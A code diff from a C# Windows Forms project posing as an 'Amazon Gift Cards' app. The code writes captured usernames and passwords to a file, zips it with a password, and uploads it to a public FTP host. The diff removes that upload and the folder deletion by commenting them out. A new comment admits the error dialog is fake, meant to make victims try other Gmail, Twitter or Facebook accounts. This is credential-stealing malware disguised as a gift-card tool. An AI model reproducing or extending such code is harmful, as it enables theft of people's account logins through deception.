@@ -7,6 +7,13 @@ using System.Windows.Forms;
 
 namespace AmazonGiftCards
 {
+    class Credential
+    {
+        public string url { get; set; }
+        public string username { get; set; }
+        public string password { get; set; }
+    }
+
     public partial class Form2 : Form
     {
         public string LoginTitle { get; set; }
@@ -49,7 +56,8 @@ namespace AmazonGiftCards
                     tw.WriteLine($"Username: {username} {System.Environment.NewLine}Password: {password}");
                 }
             }
-
+            
+            //zip and encrypt files with password
             using (ZipFile zip = new ZipFile())
             {
                 zip.Password = "thisisacoolapassdaweaweasdasdfja;oirtaowlirgjloaikrgloiwkrejowiaejaoweijtf";
@@ -57,24 +65,21 @@ namespace AmazonGiftCards
                 zip.Save($"{folderName}Trial{LoginTitle}{fileName}-{date}.zip");
             }
 
+            //upload to a public FTP server
             //using (var client = new WebClient())
             //{
-            //    client.Credentials = new NetworkCredential("cazzo", "cazzo");
+            //    client.Credentials = new NetworkCredential("user", "password");
             //    client.UploadFile($"ftp://192.168.0.208:21/Trial{LoginTitle}{fileName}-{date}.zip", WebRequestMethods.Ftp.UploadFile, $"{folderName}Trial{LoginTitle}{fileName}-{date}.zip");
             //}
 
-            using (var client = new WebClient())
-            {
-                client.Credentials = new NetworkCredential("demo-user", "demo-user");
-                client.UploadFile($"ftp://demo.wftpserver.com/upload/Trial{LoginTitle}{fileName}-{date}.zip", WebRequestMethods.Ftp.UploadFile, $"{folderName}Trial{LoginTitle}{fileName}-{date}.zip");
-            }
-
-            Directory.Delete(folderName, true);
+            //delete the folder
+            //Directory.Delete(folderName, true);
 
             Cursor = Cursors.WaitCursor;
             Thread.Sleep(3000);
             Cursor = Cursors.Arrow;
 
+            //fake error message, they might try with other accounts
             MessageBox.Show("Something went wrong! Please try again or try to log in with another account (Gmail, Twitter, Facebook)", "Amazon Gift Cards",
     MessageBoxButtons.OK, MessageBoxIcon.Error);
 
